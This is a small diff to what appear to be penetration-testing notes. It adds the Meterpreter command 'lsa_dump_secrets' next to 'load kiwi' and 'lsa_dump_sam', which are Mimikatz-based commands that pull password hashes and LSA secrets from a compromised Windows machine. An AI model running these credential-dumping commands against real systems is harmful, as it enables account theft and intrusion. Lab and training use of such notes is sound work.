@@ -47,6 +47,7 @@ getuid
 
 load kiwi
 lsa_dump_sam
+lsa_dump_secrets
 
 Look for something like
 User : admin1
